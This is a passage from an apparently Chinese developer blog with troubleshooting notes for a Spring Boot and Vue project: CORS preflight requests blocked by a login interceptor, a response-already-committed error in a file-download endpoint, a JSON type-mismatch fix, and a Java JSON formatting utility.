AdminLoginInterceptor adminLoginInterceptor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> &#123;</span><br><span class="line">        registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                .allowedOriginPatterns(<span class="string">&quot;*&quot;</span>)</span><br><span class="line">                .allowedMethods(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;HEAD&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;OPTIONS&quot;</span>)</span><br><span class="line">                .allowCredentials(<span class="literal">true</span>).allowedOrigins()</span><br><span class="line">                .maxAge(<span class="number">3600</span>)</span><br><span class="line">                .allowedHeaders(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addInterceptors</span><span class="params">(InterceptorRegistry registry)</span> &#123;</span><br><span class="line">        registry.addInterceptor(adminLoginInterceptor).excludePathPatterns(<span class="string">&quot;/getBlogs&quot;</span>,<span class="string">&quot;/getBlog/*&quot;</span>,<span class="string">&quot;/login&quot;</span>,<span class="string">&quot;/getAdminMess&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="产生问题"><a href="#产生问题" class="headerlink" title="产生问题"></a>产生问题</h2><ul><li>非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求（preflight）。</li><li>浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的XMLHttpRequest请求，否则就报错。</li><li>预检请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。</li></ul><p>在非简单请求的时候，总是报跨域访问的错误：</p><p><img src= "https://unpkg.com/nan-picture/img/load.gif" data-lazy-src="https://unpkg.com/nan-picture/blog/20201122183313.png"></p><p>预检请求被拦截器拦截后，服务器端没有给浏览器返回必要的跨域指示信息，浏览器没收到指示信息就认为服务器不允许跨域请求，就会报错。</p><h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>拦截器截取到请求时先进行判断，如果是option请求的话，则放行：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> top.nanzx.blog.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.blog.entity.Admin;</span><br><span class="line"><span class="keyword">import</span> top.nanzx.blog.service.AdminService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.Cookie;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AdminLoginInterceptor</span> <span class="keyword">implements</span> <span class="title class_">HandlerInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    AdminService adminService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">preHandle</span><span class="params">(HttpServletRequest request, HttpServletResponse response, Object handler)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;OPTIONS&quot;</span>.equals(request.getMethod().toUpperCase())) &#123;</span><br><span class="line">            System.err.println(<span class="string">&quot;OP:OK&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Cookie[] cookies = request.getCookies();</span><br><span class="line">        <span class="type">Admin</span> <span class="variable">admin</span> <span class="operator">=</span> adminService.getOne(<span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;Admin&gt;().eq(<span class="string">&quot;id&quot;</span>, <span class="number">1</span>));</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> admin.getToken();</span><br><span class="line">        <span class="keyword">for</span> (Cookie c : cookies) &#123;</span><br><span class="line">            <span class="keyword">if</span> (c.getName().equals(<span class="string">&quot;token&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> token.equals(c.getValue());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考文章：<a href="https://blog.csdn.net/miswujian/article/details/89114025">跨域与拦截器导致跨域失败</a></p><h1 id="response响应异常"><a href="#response响应异常" class="headerlink" title="response响应异常"></a>response响应异常</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.lang.IllegalStateException: Cannot call sendError() after the response has been committed</span><br></pre></td></tr></table></figure><p>下载文件接口如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Author</span>: Nan</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Param</span>: [courseId, fileName, response]</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Return</span>: top.nanzx.dto.JsonResult</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Date</span>: 12:38 2021/2/14</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@Description</span>: 下载文件接口</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="meta">@Override</span></span><br><span class="line">   <span class="keyword">public</span> JsonResult <span class="title function_">download</span><span class="params">(<span class="type">int</span> courseId, String fileName, HttpServletResponse response)</span> &#123;</span><br><span class="line">       <span class="type">Means</span> <span class="variable">means</span> <span class="operator">=</span> meansDao.queryFile(fileName, courseId);</span><br><span class="line">       <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(means.getFilePath() +<span class="string">&#x27;\\&#x27;</span>+ means.getFileName());</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JsonResult</span>(<span class="number">1</span>, <span class="string">&quot;文件不存在！&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       response.setContentType(<span class="string">&quot;application/force-download&quot;</span>);</span><br><span class="line">       response.addHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;fileName=&quot;</span> +  <span class="keyword">new</span> <span class="title class_">String</span>(fileName.getBytes(StandardCharsets.UTF_8), Charset.forName(<span class="string">&quot;ISO8859-1&quot;</span>)));</span><br><span class="line"></span><br><span class="line">       <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">           <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fis);</span><br><span class="line"></span><br><span class="line">           <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line"></span><br><span class="line">           <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> bis.read(buffer);</span><br><span class="line">           <span class="keyword">while</span> (i != -<span class="number">1</span>) &#123;</span><br><span class="line">               os.write(buffer, <span class="number">0</span>, i);</span><br><span class="line">               i = bis.read(buffer);</span><br><span class="line">           &#125;</span><br><span class="line">           fis.close();</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">           e.printStackTrace();</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JsonResult</span>(<span class="number">1</span>, <span class="string">&quot;文件下载失败。&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JsonResult</span>(<span class="number">0</span>, <span class="string">&quot;文件下载成功。&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><strong>出现这个错误，应该是多次response导致的，可以这么理解，http server发送response后就关闭了socket，这个时候再次发送response给http client就会出现这个问题。</strong>而我代码中传输完文件后，流一关闭，socket也就关闭了。</p><p>解决办法：如果下载出现问题，返回 JsonResult 让前台知道问题详情，下载成功的话，直接return null 就Ok了。</p><p>修改代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>: Nan</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Param</span>: [courseId, fileName, response]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Return</span>: top.nanzx.dto.JsonResult</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Date</span>: 12:38 2021/2/14</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>: 下载文件接口</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> JsonResult <span class="title function_">download</span><span class="params">(<span class="type">int</span> courseId, String fileName, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="type">Means</span> <span class="variable">means</span> <span class="operator">=</span> meansDao.queryFile(fileName, courseId);</span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(means.getFilePath() +<span class="string">&#x27;\\&#x27;</span>+ means.getFileName());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JsonResult</span>(<span class="number">1</span>, <span class="string">&quot;文件不存在！&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/force-download&quot;</span>);</span><br><span class="line">        response.addHeader(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">&quot;attachment;fileName=&quot;</span> +  <span class="keyword">new</span> <span class="title class_">String</span>(fileName.getBytes(StandardCharsets.UTF_8), Charset.forName(<span class="string">&quot;ISO8859-1&quot;</span>)));</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);</span><br><span class="line">            <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(fis);</span><br><span class="line"></span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">os</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> bis.read(buffer);</span><br><span class="line">            <span class="keyword">while</span> (i != -<span class="number">1</span>) &#123;</span><br><span class="line">                os.write(buffer, <span class="number">0</span>, i);</span><br><span class="line">                i = bis.read(buffer);</span><br><span class="line">            &#125;</span><br><span class="line">            fis.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">JsonResult</span>(<span class="number">1</span>, <span class="string">&quot;文件下载失败。&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="前端Json数据解析异常"><a href="#前端Json数据解析异常" class="headerlink" title="前端Json数据解析异常"></a>前端Json数据解析异常</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Resolved [org.springframework.http.converter.HttpMessageNotReadableException: </span><br><span class="line">    JSON parse error: Cannot deserialize instance of `java.lang.String` out of START_ARRAY token; </span><br><span class="line">    nested exception is com.fasterxml.jackson.databind.exc.MismatchedInputException: Cannot deserialize instance of `java.lang.String` out of START_ARRAY token</span><br><span class="line"> at [Source: (PushbackInputStream); line: 1, column: 101] (through reference chain: java.util.HashMap[&quot;object&quot;])]</span><br></pre></td></tr></table></figure><p><strong>出错原因：前端传值类型与后端接收值的类型不一致，无法解析</strong></p><p>这是我前端传输的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">    data() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">          ruleForm: &#123;</span><br><span class="line">            courseName: &#x27;&#x27;,</span><br><span class="line">            classes: [],</span><br><span class="line">          &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是我后端对应的接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/createCourse&quot;)</span></span><br><span class="line"><span class="keyword">public</span> JsonResult <span class="title function_">createCourse</span><span class="params">(<span class="meta">@RequestBody</span> HashMap&lt;String, String&gt; map)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> teacherService.createCourse(map);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前端数组类型，后端无法用string类型接收。</p><p><strong>解决方法：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">前端=&gt;后端：</span><br><span class="line"></span><br><span class="line">//格式化数组--转字符串</span><br><span class="line">this.tag = this.tag.join(&#x27;,&#x27;);</span><br><span class="line">后端=&gt;前端：</span><br><span class="line"></span><br><span class="line">//格式化字符串--转数组</span><br><span class="line">for(var i in data)&#123;</span><br><span class="line">  if(data[i].tag!==&quot;&quot;)&#123;</span><br><span class="line">    data[i].tag = data[i].tag.split(&#x27;,&#x27;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>项目代码解决：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &quot;AddCourse&quot;,</span><br><span class="line">  data() &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      ruleForm: &#123;</span><br><span class="line">        courseName: &#x27;&#x27;,</span><br><span class="line">        classes: [],</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;,</span><br><span class="line">  computed: &#123;</span><br><span class="line">    formData() &#123;</span><br><span class="line">      return &#123;</span><br><span class="line">        courseName: this.ruleForm.courseName,</span><br><span class="line">        classes: this.ruleForm.classes.join(&#x27;,&#x27;),</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    submitForm(formName) &#123;</span><br><span class="line">      this.$refs[formName].validate((valid) =&gt; &#123;</span><br><span class="line">        if (valid) &#123;</span><br><span class="line">          this.$http.post(&#x27;/teacher/createCourse&#x27;, this.formData).then((res) =&gt; &#123;</span><br><span class="line">              ...</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="String格式转JSON格式输出到文本"><a href="#String格式转JSON格式输出到文本" class="headerlink" title="String格式转JSON格式输出到文本"></a>String格式转JSON格式输出到文本</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">JsonTool</span> &#123;</span><br><span class="line">    <span class="comment">//是否采用制表符</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="variable">isTab</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">stringToJSON</span><span class="params">(String strJson)</span> &#123;</span><br><span class="line">        <span class="comment">//换行多少个退位</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">tabNum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">jsonFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> strJson.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> strJson.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (c == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                tabNum++;</span><br><span class="line">                jsonFormat.append(c).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                jsonFormat.append(getSpaceOrTab(tabNum));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                tabNum--;</span><br><span class="line">                jsonFormat.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                jsonFormat.append(getSpaceOrTab(tabNum));</span><br><span class="line">                jsonFormat.append(c);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;,&#x27;</span>) &#123;</span><br><span class="line">                jsonFormat.append(c).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                jsonFormat.append(getSpaceOrTab(tabNum));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((c == <span class="string">&#x27;:&#x27;</span> &amp;&amp; strJson.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;&quot;&#x27;</span> &amp;&amp; strJson.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&quot;&#x27;</span>)</span><br><span class="line">                    || (c == <span class="string">&#x27;:&#x27;</span> &amp;&amp; strJson.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">                    || (c == <span class="string">&#x27;:&#x27;</span> &amp;&amp; strJson.charAt(i + <span class="number">1</span>) == <span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">                    || (c == <span class="string">&#x27;:&#x27;</span> &amp;&amp; Character.isDigit(strJson.charAt(i + <span class="number">1</span>)) &amp;&amp; strJson.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;&quot;&#x27;</span>)) &#123;</span><br><span class="line">                jsonFormat.append(c);</span><br><span class="line">                jsonFormat.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;[&#x27;</span> &amp;&amp; strJson.charAt(i + <span class="number">1</span>) != <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">                tabNum++;</span><br><span class="line">                jsonFormat.append(c).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                jsonFormat.append(getSpaceOrTab(tabNum));</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;]&#x27;</span> &amp;&amp; strJson.charAt(i - <span class="number">1</span>) == <span class="string">&#x27;&quot;&#x27;</span>) &#123;</span><br><span class="line">                tabNum--;</span><br><span class="line">                jsonFormat.append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                jsonFormat.append(getSpaceOrTab(tabNum));</span><br><span class="line">                jsonFormat.append(c);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                jsonFormat.append(c);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> jsonFormat.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:追加换行后的退格</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Param</span>: [tabNum]</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Return</span>: java.lang.String</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@author</span>: Nan-ZN.Xu@qq.com</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@date</span>: 6/9/2021</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Time</span>: 3:01 PM</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSpaceOrTab</span><span class="params">(<span class="type">int</span> tabNum)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sbTab</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; tabNum; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (isTab) &#123;</span><br><span class="line">                sbTab.append(<span class="string">&#x27;\t&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                sbTab.append(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sbTab.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="将DTO保存到指定路径"><a href="#将DTO保存到指定路径" class="headerlink" title="将DTO保存到指定路径"></a>将DTO保存到指定路径</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span 